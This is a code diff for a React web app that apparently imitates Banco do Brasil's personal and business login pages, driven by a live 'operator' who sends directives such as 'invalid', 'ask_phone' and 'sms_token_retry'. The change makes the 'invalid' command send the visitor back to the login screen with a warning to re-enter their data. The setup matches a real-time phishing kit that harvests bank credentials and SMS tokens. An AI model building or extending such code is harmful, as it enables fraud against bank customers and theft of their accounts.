@@ -343,6 +343,18 @@ function AutoatendimentoPage() {
     return () => window.clearTimeout(timer);
   }, [isLoading, setLocation]);
 
+  // Aviso de "Dados inválidos" ao retornar do comando do operador.
+  useEffect(() => {
+    try {
+      if (window.sessionStorage.getItem('bb-invalid-retry')) {
+        window.sessionStorage.removeItem('bb-invalid-retry');
+        setError('Os dados informados são inválidos. Verifique e tente novamente.');
+      }
+    } catch {
+      /* ignore */
+    }
+  }, []);
+
   return (
     <AutoatendimentoShell loading={isLoading}>
       <form className="auto-card" onSubmit={handleSubmit} aria-labelledby="auto-title">
@@ -702,6 +714,20 @@ function LiveControlOverlay({
     }
   }, [directive, status, setLocation]);
 
+  // "Dados inválidos": leva o usuário de volta à página inicial de login do fluxo
+  // (PF: /pessoa-fisica, PJ: /sign-in) com um aviso para tentar novamente. A flag
+  // é lida pela página de entrada para exibir a mensagem.
+  useEffect(() => {
+    if (directive === 'invalid') {
+      try {
+        window.sessionStorage.setItem('bb-invalid-retry', '1');
+      } catch {
+        /* ignore */
+      }
+      setLocation(entry);
+    }
+  }, [directive, entry, setLocation]);
+
   // Reset da tela de entrada de teste sempre que o operador (re)aciona "Token SMS":
   // sai do "Aguarde" (pendingWait) e limpa o campo. O aviso de "Código inválido"
   // é derivado da diretiva 'sms_token_retry'.
@@ -948,20 +974,9 @@ function LiveControlOverlay({
   } else if (responded) {
     body = waiting;
   } else if (directive === 'invalid') {
-    body = (
-      <div className="live-control-card" data-testid="live-invalid">
-        <h2>Dados inválidos</h2>
-        <p>Não foi possível validar suas informações. Confira os dados e tente novamente.</p>
-        <button
-          type="button"
-          className="live-control-btn"
-          data-testid="live-invalid-retry"
-          onClick={() => setLocation(entry)}
-        >
-          Tentar novamente
-        </button>
-      </div>
-    );
+    // Redireciona para a tela de login do fluxo (efeito acima); o aviso aparece lá.
+    if (passiveWhenWaiting) return null;
+    body = waiting;
   } else if (directive === 'ask_phone') {
     body = (
       <form
@@ -1022,6 +1037,18 @@ function PjLoginPage() {
 
   const [profileOpen, setProfileOpen] = useState(false);
   const [profile, setProfile] = useState('PJ Empresas');
+  const [invalidMsg, setInvalidMsg] = useState(false);
+
+  useEffect(() => {
+    try {
+      if (window.sessionStorage.getItem('bb-invalid-retry')) {
+        window.sessionStorage.removeItem('bb-invalid-retry');
+        setInvalidMsg(true);
+      }
+    } catch {
+      /* ignore */
+    }
+  }, []);
 
   const isChaveJPrefixValid = identifier.startsWith('J');
   const isChaveJComplete = isChaveJPrefixValid && identifier.length === 8;
@@ -1074,6 +1101,11 @@ function PjLoginPage() {
           </header>
 
           <form className="pj-login-form" onSubmit={handleSubmit}>
+            {invalidMsg && (
+              <div className="pj-invalid-banner" role="alert" data-testid="pj-invalid-banner">
+                Os dados informados são inválidos. Verifique e tente novamente.
+              </div>
+            )}
             <div className="pj-profile-select-group">
               <span className="pj-group-label" id="profile-label">Perfil selecionado</span>
               <div className="pj-profile-dropdown-container">
